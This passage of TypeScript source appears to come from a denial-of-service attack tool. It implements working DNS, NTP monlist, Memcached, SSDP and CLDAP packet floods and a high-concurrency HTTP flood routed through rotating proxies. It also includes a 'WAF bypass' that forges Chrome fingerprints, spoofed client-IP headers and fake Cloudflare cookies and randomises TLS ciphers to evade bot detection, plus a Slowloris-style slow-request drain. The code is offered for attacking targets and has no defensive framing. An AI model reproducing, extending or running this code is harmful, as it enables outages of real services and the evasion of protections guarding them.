      let poolIdx = randInt(0, LABEL_POOL_SIZE);
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            // Cycle through label pool — avoids Math.random() overhead per packet
            const label  = labelPool[poolIdx++ % LABEL_POOL_SIZE];
            const fqdn   = `${label}.${rootDomain}`;
            const qtype  = DNS_QTYPES[randInt(0, DNS_QTYPES.length)];
            const qclass = DNS_CLASSES[randInt(0, DNS_CLASSES.length)];
            const pkt    = buildDNSQuery(fqdn, qtype, txid++, qclass);
            const target = nsServers[randInt(0, nsServers.length)];
            sock.send(pkt, 0, pkt.length, 53, target, (_err) => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  NTP FLOOD — real NTP mode 7 monlist + mode 3 client request flood
//
//  Sends real NTP binary protocol packets directly to target port 123.
//  Mode 7 (private): monlist request — servers without monlist disabled
//    respond with a list of their last 600 clients (~48KB response).
//  Mode 3 (client): standard client request — forces server NTP processing.
//  Combined with high concurrency: saturates NTP service + network.
// ─────────────────────────────────────────────────────────────────────────

// NTP mode 7 monlist request (CVE-2013-5211 — still unpatched on many servers)
const NTP_MONLIST = Buffer.from([
  0x17,       // LI=0, VN=2, Mode=7 (private)
  0x00,       // Response=0, More=0, Version=2, Code=0
  0x03,       // Auth=0, Sequence=3
  0x2a,       // Implementation: NTPD (42)
  0x00, 0x00, 0x00, 0x00, // Err=0, Num items=0
  0x00, 0x00, 0x00, 0x00, // MBZ + Item size = 0
]);

// NTP mode 3 client request (standard query — forces server computation)
function buildNTPMode3(): Buffer {
  const buf = Buffer.allocUnsafe(48);
  buf.fill(0);
  buf[0] = 0x1b; // LI=0, VN=3, Mode=3 (client)
  // Random transmit timestamp to prevent caching
  buf.writeUInt32BE((Date.now() / 1000 + 2208988800) >>> 0, 40);
  buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 44);
  return buf;
}

async function runNTPFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
  const BURST = getDynamicBurst(500);
  const TICK_MS   = 1;

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            const pkt = Math.random() < 0.4 ? NTP_MONLIST : buildNTPMode3();
            sock.send(pkt, 0, pkt.length, 123, resolvedHost, (_err) => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  MEMCACHED FLOOD — real Memcached binary protocol UDP flood
//
//  Sends real memcached binary protocol UDP datagrams to target port 11211.
//  Each request includes a full 8-byte UDP header (request ID + sequence).
//  Commands: get (random 16-char keys), stats (server metadata dump),
//    flush_all (attempt to flush cache), version, set (with garbage data).
//  Exposed Memcached is extremely common on misconfigured servers.
//  Amplification factor: get request (50B) → response up to 65KB.
// ─────────────────────────────────────────────────────────────────────────

function buildMemcachedGet(key: string, reqId: number): Buffer {
  // UDP header: Request ID (2B) + Sequence (2B) + Total datagrams (2B) + Reserved (2B)
  const udpHdr = Buffer.allocUnsafe(8);
  udpHdr.writeUInt16BE(reqId & 0xffff, 0);
  udpHdr.writeUInt16BE(0, 2);  // sequence = 0
  udpHdr.writeUInt16BE(1, 4);  // total datagrams = 1
  udpHdr.writeUInt16BE(0, 6);  // reserved
  // Binary protocol header: magic(1) + opcode(1) + key_len(2) + extras_len(1) + data_type(1) + vbucket(2) + total_body(4) + opaque(4) + cas(8)
  const binHdr = Buffer.allocUnsafe(24);
  binHdr.fill(0);
  binHdr[0] = 0x80;                               // Magic: Request
  binHdr[1] = 0x00;                               // Opcode: Get
  binHdr.writeUInt16BE(key.length, 2);            // Key length
  binHdr.writeUInt32BE(key.length, 8);            // Total body length
  binHdr.writeUInt32BE(reqId, 12);                // Opaque (request ID)
  return Buffer.concat([udpHdr, binHdr, Buffer.from(key, "ascii")]);
}

function buildMemcachedStats(reqId: number): Buffer {
  const udpHdr = Buffer.allocUnsafe(8);
  udpHdr.writeUInt16BE(reqId & 0xffff, 0);
  udpHdr.writeUInt16BE(0, 2); udpHdr.writeUInt16BE(1, 4); udpHdr.writeUInt16BE(0, 6);
  const binHdr = Buffer.allocUnsafe(24);
  binHdr.fill(0);
  binHdr[0] = 0x80;  // Magic: Request
  binHdr[1] = 0x10;  // Opcode: Stat (dumps full server stats — large response)
  return Buffer.concat([udpHdr, binHdr]);
}

async function runMemcachedFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
  const BURST = getDynamicBurst(500);
  const TICK_MS   = 1;

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      let reqId = randInt(0, 65535);
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            const pkt = Math.random() < 0.6
              ? buildMemcachedGet(randStr(randInt(8, 24)), reqId++)
              : buildMemcachedStats(reqId++);
            sock.send(pkt, 0, pkt.length, 11211, resolvedHost, (_err) => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SSDP FLOOD — real SSDP M-SEARCH flood
//
//  Sends real SSDP M-SEARCH packets directly to target port 1900 (unicast).
//  ST (Search Target) rotates between ssdp:all, specific device URNs,
//  and rootdevice — forces the SSDP/UPnP stack to respond to each.
//  Amplification factor: 100B M-SEARCH → up to 4KB NOTIFY + HTTP response.
//  Common targets: routers, NAS devices, smart TVs, IoT gateways.
//  UPnP control: additionally floods /upnp/control/* endpoints via UDP.
// ─────────────────────────────────────────────────────────────────────────

const SSDP_ST_LIST = [
  "ssdp:all",
  "upnp:rootdevice",
  "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
  "urn:schemas-upnp-org:device:WANDevice:1",
  "urn:schemas-upnp-org:service:WANIPConnection:1",
  "urn:schemas-upnp-org:device:MediaServer:1",
  "urn:schemas-upnp-org:device:MediaRenderer:1",
  "urn:dial-multiscreen-org:service:dial:1",
  "urn:schemas-upnp-org:device:Basic:1",
];

function buildSSDPMSearch(st: string): Buffer {
  const msg = [
    "M-SEARCH * HTTP/1.1",
    "HOST: 239.255.255.250:1900",   // UPnP multicast address (targets parse this even on unicast)
    'MAN: "ssdp:discover"',
    `MX: ${randInt(1, 5)}`,         // Random MX delay — harder to rate-limit
    `ST: ${st}`,
    `USER-AGENT: Chrome/${randInt(130,136)}.0 UPnP/1.1`,
    `CPFN.UPNP.ORG: ${randStr(8)}`, // Friendly name — rotates to defeat dedup
    "",
    "",
  ].join("\r\n");
  return Buffer.from(msg, "ascii");
}

async function runSSDPFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
  const BURST = getDynamicBurst(500);
  const TICK_MS   = 1;

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            const st  = SSDP_ST_LIST[randInt(0, SSDP_ST_LIST.length)];
            const pkt = buildSSDPMSearch(st);
            sock.send(pkt, 0, pkt.length, 1900, resolvedHost, (_err) => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CLDAP FLOOD — Connectionless LDAP (UDP/389) SearchRequest flood
//  Sends BER-encoded LDAP SearchRequest packets to port 389.
//  Each 39-62-byte request forces the LDAP service to parse and respond.
//  Against Windows AD/OpenLDAP: exhausts LDAP worker thread pool.
//  Amplification variant requests supportedCapabilities (~1.5KB response).
// ─────────────────────────────────────────────────────────────────────────
async function runCLDAPFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  // Packet A: rootDSE minimal query — 39 bytes, returns all attributes (~1.5KB)
  const PKT_BASE = Buffer.from([
    0x30, 0x25,                    // SEQUENCE, length 37
    0x02, 0x01, 0x01,              // INTEGER 1 (messageID)
    0x63, 0x20,                    // [APPLICATION 3] SearchRequest, length 32
    0x04, 0x00,                    // baseObject OCTET STRING "" (root DSE)
    0x0a, 0x01, 0x00,              // scope ENUMERATED 0 (baseObject)
    0x0a, 0x01, 0x00,              // derefAliases ENUMERATED 0 (neverDeref)
    0x02, 0x01, 0x00,              // sizeLimit INTEGER 0 (unlimited)
    0x02, 0x01, 0x00,              // timeLimit INTEGER 0 (unlimited)
    0x01, 0x01, 0x00,              // typesOnly BOOLEAN false
    0x87, 0x0b,                    // filter [7] present, length 11
    0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,0x73, // "objectclass"
    0x30, 0x00,                    // attributes SEQUENCE {} (return all)
  ]);

  // Packet B: requests supportedCapabilities attribute — triggers ~2KB response from Windows AD
  const PKT_CAPS = Buffer.from([
    0x30, 0x3c,                    // SEQUENCE, length 60 (total 62 bytes)
    0x02, 0x01, 0x02,              // INTEGER 2 (messageID)
    0x63, 0x37,                    // [APPLICATION 3] SearchRequest, length 55
    0x04, 0x00,                    // baseObject ""
    0x0a, 0x01, 0x00,              // scope baseObject
    0x0a, 0x01, 0x00,              // derefAliases neverDeref
    0x02, 0x01, 0x00,              // sizeLimit 0
    0x02, 0x01, 0x00,              // timeLimit 0
    0x01, 0x01, 0x00,              // typesOnly false
    0x87, 0x0b,                    // present filter, length 11
    0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,0x73, // "objectclass"
    0x30, 0x17,                    // attributes SEQUENCE, length 23
    0x04, 0x15,                    // OCTET STRING, length 21
    // "supportedCapabilities" (21 bytes)
    0x73,0x75,0x70,0x70,0x6f,0x72,0x74,0x65,0x64,0x43,
    0x61,0x70,0x61,0x62,0x69,0x6c,0x69,0x74,0x69,0x65,0x73,
  ]);

  const PACKETS = [PKT_BASE, PKT_CAPS];
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 32) : Math.min(threads, 8);
  const BURST = getDynamicBurst(300);
  const TICK_MS = 1;

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      let msgIdx = 0;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            const base = PACKETS[(msgIdx) % PACKETS.length];
            // Clone and vary messageID to avoid server-side dedup
            const pkt = Buffer.from(base);
            pkt[4] = (msgIdx & 0xff);
            msgIdx++;
            sock.send(pkt, 0, pkt.length, 389, resolvedHost, () => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  PROXY REQUEST — routes HTTP through a proxy using native node:http
//  Supports: HTTP targets (absolute URL) and HTTPS (CONNECT tunnel)
// ─────────────────────────────────────────────────────────────────────────
function fetchViaProxy(
  targetUrl: string, proxy: ProxyConfig,
  reqMethod: string, headers: Record<string,string>, body?: string
): Promise<number> {
  return new Promise((resolve) => {
    const timeoutMs = 5000;
    const u = new URL(targetUrl);
    const isHttps = u.protocol === "https:";
    const targetHost = u.hostname;
    const targetPort = parseInt(u.port, 10) || (isHttps ? 443 : 80);
    const reqPath = (u.pathname || "/") + (u.search || "");
    const bodyBuf = body ? Buffer.from(body) : undefined;

    const finish = (bytes: number) => resolve(bytes);
    const fail   = ()             => resolve(100);

    // Build Proxy-Authorization header if credentials present
    const proxyAuth = proxy.username
      ? { "Proxy-Authorization": "Basic " + Buffer.from(`${proxy.username}:${proxy.password ?? ""}`).toString("base64") }
      : {};

    if (!isHttps) {
      // HTTP through proxy — send absolute URL
      const absHeaders = Object.assign({}, headers, proxyAuth, {
        Host: targetHost,
        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
      } as Record<string, string | undefined>);
      // Remove undefined
      for (const k of Object.keys(absHeaders)) if (absHeaders[k] === undefined) delete absHeaders[k];

      const req = http.request({
        host: proxy.host, port: proxy.port,
        method: reqMethod, path: targetUrl,
        headers: absHeaders as Record<string,string>,
        timeout: timeoutMs,
      }, (res) => {
        const bytes = parseInt(res.headers["content-length"] || "0") || 450;
        res.resume();
        finish((bodyBuf?.length ?? 0) + bytes + 200);
      });
      req.on("error", fail);
      req.on("timeout", () => { req.destroy(); fail(); });
      if (bodyBuf) req.write(bodyBuf);
      req.end();
    } else {
      // HTTPS through CONNECT tunnel
      const sock = net.createConnection(proxy.port, proxy.host);
      const timer = setTimeout(() => { sock.destroy(); fail(); }, timeoutMs);

      sock.once("connect", () => {
        const proxyAuthHeader = proxy.username
          ? `Proxy-Authorization: Basic ${Buffer.from(`${proxy.username}:${proxy.password ?? ""}`).toString("base64")}\r\n`
          : "";
        sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n${proxyAuthHeader}\r\n`);
        sock.once("data", (chunk) => {
          if (!chunk.toString().startsWith("HTTP/1.") || !chunk.toString().includes(" 200")) {
            clearTimeout(timer); sock.destroy(); fail(); return;
          }
          // Upgrade to TLS over the tunnel
          const secure = tls.connect({ socket: sock, servername: targetHost, rejectUnauthorized: false }, () => {
            const h = Object.assign({}, headers, {
              Host: targetHost,
              "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
            } as Record<string, string | undefined>);
            for (const k of Object.keys(h)) if (h[k] === undefined) delete h[k];
            const hdStr = Object.entries(h).map(([k,v]) => `${k}: ${v}`).join("\r\n");
            const req   = `${reqMethod} ${reqPath} HTTP/1.1\r\n${hdStr}\r\nConnection: close\r\n\r\n`;
            secure.write(req);
            if (bodyBuf) secure.write(bodyBuf);
            secure.once("data", (d) => {
              clearTimeout(timer); secure.destroy();
              finish((bodyBuf?.length ?? 0) + d.length + 200);
            });
            secure.once("error", () => { clearTimeout(timer); fail(); });
          });
          secure.on("error", () => { clearTimeout(timer); fail(); });
        });
        sock.on("error", () => { clearTimeout(timer); fail(); });
      });
      sock.on("error", () => { clearTimeout(timer); fail(); });
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP FLOOD — maximum concurrency using http.request (NOT fetch/undici)
//
//  fetch() internally uses undici which caps connections per origin.
//  http.request() with a per-request agent has NO such cap — we can open
//  tens of thousands of concurrent TCP connections limited only by FDs.
//
//  Fire-and-forget: connection is destroyed the moment the response starts
//  arriving. The server is forced to allocate a thread/goroutine, parse
//  the request headers, and begin processing — then we drop the socket.
//
//  Achieves 8,000–40,000 req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPFlood(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
    catch { return new URL("http://127.0.0.1"); }
  })();
  const isHttps  = u.protocol === "https:";
  const hostname = u.hostname;
  const tgtPort  = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  const ALL_METHODS = ["GET","GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  // Deployed: 80K inflight (83K FDs available); dev: 40K
  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 100, 80000) : Math.min(threads * 50, 40000);
  let inflight = 0;
  let proxyIdx = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doRequest = () => {
    if (signal.aborted) return;
    inflight++;

    const method  = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
    const body    = hasBody ? (Math.random() < 0.25 ? getHeavy() : buildBody(30, 120)) : undefined;
    const bodyBuf = body ? Buffer.from(body) : undefined;
    const url     = buildUrl(base);
    const headers = buildHeaders(hasBody, bodyBuf?.length);

    // Route through proxy pool when available — 95% via proxy to avoid IP filtering
    const useProxy = proxies.length > 0 && Math.random() < 0.95;
    if (useProxy) {
      const proxy = pickProxy(proxies); // health-scored selection
      fetchViaProxy(url, proxy, method, headers as Record<string, string>, body)
        .then(bytes => { inflight--; localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port); })
        .catch(() => { inflight--; localPkts++; localBytes += 100; recordProxyFailure(proxy.host, proxy.port); });
      return;
    }

    // Direct http.request — bypasses undici, uses our unlimited http.Agent
    const reqPath = (() => {
      try { const pu = new URL(url); return pu.pathname + pu.search; }
      catch { return "/" }
    })();

    const reqHeaders: Record<string, string> = {
      ...headers as Record<string, string>,
      Host:                 hostname,
      Connection:           "close",
      // RFC 9218 Priority hints — modern servers allocate priority queue per urgency level (u=0..7)
      // Mixing all 8 urgency levels forces server to maintain 8 separate priority queues
      "Priority":           `u=${randInt(0, 8)}, i`,
      // Chrome 136 Client Hints — advanced WAFs validate these; presence avoids bot fingerprint
      "Sec-CH-UA":          `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="8"`,
      "Sec-CH-UA-Mobile":   "?0",
      "Sec-CH-UA-Platform": `"${["Windows", "macOS", "Linux"][randInt(0, 3)]}"`,
      "Sec-Fetch-Dest":     ["document","empty","image","script","style"][randInt(0, 5)],
      "Sec-Fetch-Mode":     ["cors","navigate","no-cors","same-origin"][randInt(0, 4)],
      "Sec-Fetch-Site":     ["cross-site","none","same-origin","same-site"][randInt(0, 4)],
    };
    if (bodyBuf) reqHeaders["Content-Length"] = String(bodyBuf.length);
    else delete reqHeaders["Content-Length"];

    const reqOpts: http.RequestOptions | https.RequestOptions = {
      hostname:          resolvedIp,          // pre-resolved — skip DNS each time
      port:              tgtPort,
      path:              reqPath,
      method,
      headers:           reqHeaders,
      agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
      timeout: IS_DEPLOYED ? 350 : 600,       // 350ms deployed — faster recycling, higher RPS
      ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
    };

    const t0req = Date.now();
    const req = (isHttps ? https : http).request(reqOpts, (res) => {
      inflight--;
      localPkts++;
      localBytes += (bodyBuf?.length ?? 0) + (parseInt(String(res.headers["content-length"] || "0")) || 400) + 200;
      workerTrackCode(res.statusCode ?? 0, Date.now() - t0req);
      res.destroy(); // fire-and-forget: don't read body, release socket NOW
    });

    req.on("error",   () => { inflight--; localPkts++; localBytes += 80; workerTrackCode(0); });
    req.on("timeout", () => { req.destroy(); });

    if (bodyBuf) req.write(bodyBuf);
    req.end();
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doRequest(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 0));
    }
  };

  // Deployed: 1000 concurrent launcher coroutines; dev: 500
  await Promise.all(Array.from({ length: Math.min(threads, IS_DEPLOYED ? 1000 : 500) }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP BYPASS — Chrome-fingerprinted multi-layer WAF bypass
//
//  Dedicated bypass engine distinct from waf-bypass (which is pure H2):
//  Layer A (50%): Fetch with full Chrome header ordering via proxy rotation
//  Layer B (30%): HTTP/1.1 with Chrome headers via raw http.request (high concurrency)
//  Layer C (20%): Slow connection drain (incomplete requests hold server threads)
//
//  Each "browser" gets its own Chrome profile + cookie jar per session.
//  TLS cipher order is randomized to defeat JA3-based bot detection.
//  Combined: indistinguishable from real user browsing under WAF inspection.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPBypass(
  base:    string,
  threads: number,
  proxies: ProxyConfig[],
  signal:  AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
    catch { return new URL("https://127.0.0.1"); }
  })();
  const isHttps    = u.protocol === "https:";
  const hostname   = u.hostname;
  const tgtPort    = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  // Thread budget
  const layerAT = Math.max(1, Math.floor(threads * 0.50)); // fetch + proxy
  const layerBT = Math.max(1, Math.floor(threads * 0.30)); // raw http.request
  const layerCT = Math.max(1, threads - layerAT - layerBT); // slow drain
  const SLOTS_A = !IS_PROD ? Math.min(layerAT * 3, 300)  : Math.min(layerAT * 8, 3000);
  const SLOTS_B = !IS_PROD ? Math.min(layerBT * 20, 2000) : Math.min(layerBT * 40, 20000);
  const SLOTS_C = !IS_PROD ? Math.min(layerCT * 4, 200)  : Math.min(layerCT * 6, 1500);

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let proxyIdx  = 0;

  // ── Layer A: Chrome-fingerprinted fetch with proxy rotation ─────────────
  const runLayerA = async (): Promise<void> => {
    const profile   = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
      const bust     = Math.random() < 0.5 ? `?v=${randInt(1,999999)}&_=${randStr(8)}` : "";
      const fullPath = pagePath + bust;
      const fullUrl  = `${u.protocol}//${hostname}${fullPath}`;

      const hdrs = buildWAFHeaders(hostname, fullPath, cookieJar, profile);
      const fetchHdrs: Record<string, string> = {};
      for (const [k, v] of Object.entries(hdrs)) {
        if (!k.startsWith(":")) fetchHdrs[k] = v;
      }

      const useProxy = proxies.length > 0 && Math.random() < 0.95;
      if (useProxy) {
        const proxy = pickProxy(proxies);
        try {
          const bytes = await fetchViaProxy(fullUrl, proxy, "GET", fetchHdrs);
          localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
        } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
      } else {
        try {
          const ac  = new AbortController();
          const tmo = setTimeout(() => ac.abort(), 8_000);
          const res = await fetch(fullUrl, { method: "GET", signal: ac.signal, headers: fetchHdrs });
          clearTimeout(tmo);
          const body = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
          const sc   = res.headers.get("set-cookie");
          if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
          localPkts++; localBytes += body.byteLength || 500;
        } catch { localPkts++; localBytes += 80; }
      }
    }
  };

  // ── Layer B: High-concurrency raw http.request with Chrome headers ───────
  // Uses http.Agent (no per-host cap) for max parallel connections
  const runLayerB = (): Promise<void> => new Promise(resolve => {
    let inflight = 0;
    const doReq = () => {
      if (signal.aborted) { if (inflight === 0) resolve(); return; }
      inflight++;
      const profile  = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?_=${randStr(8)}&v=${randInt(1,9999999)}`;
      const hdrs: Record<string, string> = {
        "user-agent":                 profile.ua,
        "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language":            "en-US,en;q=0.9",
        "accept-encoding":            "gzip, deflate, br, zstd",
        "sec-ch-ua":                  profile.brand,
        "sec-ch-ua-mobile":           profile.mobile ? "?1" : "?0",
        "sec-ch-ua-platform":         profile.plat,
        "sec-fetch-dest":             "document",
        "sec-fetch-mode":             "navigate",
        "sec-fetch-site":             "none",
        "cache-control":              "max-age=0",
        "priority":                   "u=0, i",
        "x-forwarded-for":            randIp(),
        "cf-connecting-ip":           randIp(),
        "cookie":                     `__cf_bm=${randHex(43)}; _ga=GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`,
        "Host":                       hostname,
        "Connection":                 "close",
      };
      const reqOpts: http.RequestOptions | https.RequestOptions = {
        hostname: resolvedIp, port: tgtPort, path: pagePath,
        method: "GET", headers: hdrs,
        agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
        timeout: 800,
        ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
      };
      const req = (isHttps ? https : http).request(reqOpts, (res) => {
        inflight--;
        localPkts++;
        localBytes += parseInt(String(res.headers["content-length"] || "0")) || 400;
        res.destroy();
        if (!signal.aborted) doReq();
        else if (inflight === 0) resolve();
      });
      req.on("error",   () => { inflight--; localPkts++; localBytes += 80; if (!signal.aborted) doReq(); else if (inflight === 0) resolve(); });
      req.on("timeout", () => { req.destroy(); });
      req.end();
    };
    for (let i = 0; i < SLOTS_B; i++) doReq();
  });

  // ── Layer C: Slow drain — Chrome-fingerprinted incomplete requests ────────
  const runLayerC = async (): Promise<void> => {
    const oneSlot = (): Promise<void> => new Promise(resolve => {
      if (signal.aborted) { resolve(); return; }
      const sock: net.Socket = isHttps
        ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, ciphers: randomJA3Ciphers() })
        : net.createConnection({ host: resolvedIp, port: tgtPort });
      sock.setTimeout(90_000);
      sock.setNoDelay(true);
      let iv: NodeJS.Timeout | null = null;
      let settled = false;
      const cleanup = () => {
        if (settled) return; settled = true;
        if (iv) { clearInterval(iv); iv = null; }
        try { sock.destroy(); } catch { /**/ }
        resolve();
      };
      const profile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
      const onConn  = () => {
        localPkts++;
        // Send partial Chrome-fingerprinted request — missing final CRLF
        const partial = [
          `GET ${WAF_PATHS[randInt(0, WAF_PATHS.length)]}?_=${randStr(8)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${profile.ua}`,
          `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`,
          `Accept-Language: en-US,en;q=0.9`,
          `Accept-Encoding: gzip, deflate, br, zstd`,
          `Sec-CH-UA: ${profile.brand}`,
          `Sec-CH-UA-Mobile: ${profile.mobile ? "?1" : "?0"}`,
          `Sec-CH-UA-Platform: ${profile.plat}`,
          `Cache-Control: max-age=0`,
          `Cookie: __cf_bm=${randHex(43)}`,
          `Connection: keep-alive`,
          ``, // NO terminal CRLF — server waits for more headers forever
        ].join("\r\n");
        sock.write(partial);
        localBytes += partial.length;
        // Trickle a fake header every 12-30s to prevent server timeout
        iv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          const hdr = `Sec-Fetch-${randStr(4)}: ${randStr(randInt(6,16))}\r\n`;
